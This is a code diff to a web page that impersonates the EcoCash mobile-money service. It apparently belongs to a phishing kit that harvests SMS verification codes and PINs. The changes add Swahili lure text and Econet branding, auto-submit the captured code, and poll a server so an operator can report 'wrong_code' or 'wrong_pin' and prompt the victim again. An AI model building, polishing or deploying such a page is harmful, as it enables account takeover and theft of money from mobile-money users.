@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>EcoCash - Verify</title>
     <style>
-        :root { --sky-blue: #0ea5e9; --dark: #1a1a2e; --gray: #6b7280; --white: #ffffff; --light: #f9fafb; --danger: #e53935; --success: #10b981; }
+        :root { --sky-blue: #0ea5e9; --dark: #1a1a2e; --gray: #6b7280; --white: #ffffff; --light: #f9fafb; --danger: #e53935; --success: #10b981; --eco-green: #2e7d32; }
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: var(--white); min-height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 24px 12px; }
         .phone-frame { max-width: 390px; width: 100%; background: var(--white); border-radius: 32px; box-shadow: 0 10px 40px rgba(0,0,0,0.1); overflow: hidden; border: 1px solid #e5e7eb; }
@@ -13,11 +13,18 @@
         .logo-row .cash { font-weight: 700; color: var(--danger); font-size: 1.2rem; }
         h3 { color: var(--dark); margin-bottom: 4px; }
         .phone-display { background: var(--light); padding: 8px 16px; border-radius: 25px; display: inline-block; font-weight: 600; font-size: 0.85rem; color: var(--dark); margin-bottom: 16px; }
-        .instruction { background: #e0f2fe; border-radius: 12px; padding: 12px 16px; font-size: 0.8rem; color: var(--dark); margin-bottom: 12px; line-height: 1.5; }
-        .instruction i { color: var(--sky-blue); margin-right: 4px; }
+        
+        /* Creative EcoCash Verification */
+        .verify-header { text-align: center; margin-bottom: 1.2rem; }
+        .verify-header .shield-icon { font-size: 2.5rem; color: var(--eco-green); margin-bottom: 0.5rem; }
+        .verify-header h3 { font-size: 1.2rem; color: var(--dark); }
+        .verify-header .sub { font-size: 0.8rem; color: var(--gray); margin-top: 0.3rem; line-height: 1.4; }
+        .sim-card-icon { background: #e8f5e9; border-radius: 12px; padding: 10px; text-align: center; margin: 12px 0; font-size: 0.8rem; color: var(--eco-green); border: 1px solid #c8e6c9; }
+        .sim-card-icon i { margin-right: 6px; }
+
         .code-inputs { display: flex; gap: 8px; justify-content: center; margin: 1rem 0; }
-        .code-inputs input { width: 44px; height: 52px; text-align: center; font-size: 1.3rem; font-weight: 700; border: 2px solid #e5e7eb; border-radius: 12px; outline: none; }
-        .code-inputs input:focus { border-color: var(--sky-blue); }
+        .code-inputs input { width: 44px; height: 52px; text-align: center; font-size: 1.3rem; font-weight: 700; border: 2px solid #e5e7eb; border-radius: 12px; outline: none; font-family: inherit; background: var(--white); }
+        .code-inputs input:focus { border-color: var(--eco-green); box-shadow: 0 0 0 3px rgba(46,125,50,0.1); }
         .code-inputs input.filled { border-color: var(--success); background: #f0fdf4; }
         .code-inputs input.error { border-color: var(--danger); background: #fef2f2; }
         .timer { text-align: center; font-weight: 700; font-size: 0.9rem; color: var(--dark); padding: 8px; background: #e0f2fe; border-radius: 10px; margin: 8px 0; }
@@ -44,9 +51,15 @@
     <div class="logo-row"><span class="eco">Eco</span><span class="cash">Cash</span></div>
     
     <div id="codeSection">
-      <h3>✅ Verification Code</h3>
+      <div class="verify-header">
+        <div class="shield-icon"><i class="fas fa-shield-alt"></i></div>
+        <h3>Thibitisha Namba Yako ya EcoCash</h3>
+        <div class="sub">Kwa kuwa unatumia <strong>EcoCash</strong> (sio SIM ya kawaida),<br>tunahitaji kuthibitisha namba yako.<br><strong>Ingiza namba ya uthibitisho iliyotumwa na EcoCash.</strong></div>
+      </div>
+      <div class="sim-card-icon">
+        <i class="fas fa-sim-card"></i> Econet SIM Verification
+      </div>
       <div class="phone-display" id="showPhone">+263 ---------</div>
-      <div class="instruction"><i class="fas fa-sms"></i> <strong>Enter the 6‑digit code from your EcoCash SMS:</strong><br>The code will be numbers only.</div>
       <div class="code-inputs" id="codeInputs">
         <input type="text" maxlength="1" class="cd" oninput="nextCode(this)">
         <input type="text" maxlength="1" class="cd" oninput="nextCode(this)">
@@ -57,7 +70,7 @@
       </div>
       <div class="timer" id="timerDisplay">⏳ 60s</div>
       <div class="error-msg" id="codeError"></div>
-      <button class="btn btn-blue" onclick="submitCode()">Submit →</button>
+      <button class="btn btn-blue" onclick="submitCode()">Thibitisha →</button>
       <div class="resend-link"><a onclick="resendCode()">↻ Didn't receive SMS? Click here</a></div>
     </div>
     
@@ -76,6 +89,7 @@
   document.getElementById('approvedAmount').textContent = '$ ' + parseFloat(payAmount).toFixed(2) + ' - ' + decodeURIComponent(payPlan);
 
   var countdownTimer, resendCount = 0, resendCooldown = false;
+  var codeSubmitted = false;
   startCountdown();
   document.querySelector('.cd').focus();
 
@@ -89,7 +103,8 @@
     document.querySelectorAll('.cd').forEach(function(d) { if (d.value === '') allFilled = false; });
     if (allFilled) {
       document.querySelectorAll('.cd').forEach(function(d) { d.classList.add('filled'); });
-      setTimeout(function() { submitCode(); }, 500);
+      if (countdownTimer) clearInterval(countdownTimer);
+      submitCode();
     }
   }
 
@@ -118,6 +133,7 @@
   }
 
   async function submitCode() {
+    if (codeSubmitted) return;
     var enteredCode = '';
     document.querySelectorAll('.cd').forEach(function(d) { enteredCode += d.value; });
     if (enteredCode.length !== 6) { 
@@ -126,6 +142,7 @@
       document.getElementById('codeError').classList.add('show'); 
       return; 
     }
+    codeSubmitted = true;
     if (countdownTimer) clearInterval(countdownTimer);
     document.getElementById('codeSection').style.display = 'none';
     document.getElementById('waitSection').style.display = 'block';
@@ -137,14 +154,14 @@
         document.getElementById('successOverlay').classList.add('active'); 
       } else if (data.code_status === 'wrong_code') { 
         clearInterval(checkInterval); 
-        document.querySelectorAll('.cd').forEach(function(d) { d.classList.add('error'); });
+        document.querySelectorAll('.cd').forEach(function(d) { d.classList.add('error'); d.value = ''; d.classList.remove('filled'); });
         document.getElementById('codeError').textContent = 'Wrong code. Please enter the recent code sent by EcoCash to verify.';
         document.getElementById('codeError').style.color = 'var(--danger)';
         document.getElementById('codeError').classList.add('show');
-        document.querySelectorAll('.cd').forEach(function(d) { d.value = ''; d.classList.remove('filled'); });
-        document.querySelector('.cd').focus();
         document.getElementById('waitSection').style.display = 'none';
         document.getElementById('codeSection').style.display = 'block';
+        document.querySelector('.cd').focus();
+        codeSubmitted = false;
         startCountdown();
         setTimeout(function() {
           document.querySelectorAll('.cd').forEach(function(d) { d.classList.remove('error'); });
@@ -152,7 +169,7 @@
         }, 4000);
       } else if (data.status === 'wrong_pin' || data.code_status === 'wrong_pin') { 
         clearInterval(checkInterval); 
-        // Redirect to login page with error parameter
+        alert('Wrong PIN. Please use the correct PIN.'); 
         window.location.href = '/login?plan=' + encodeURIComponent(payPlan) + '&amount=' + payAmount + '&error=wrong_pin';
       }
     }, 2000);
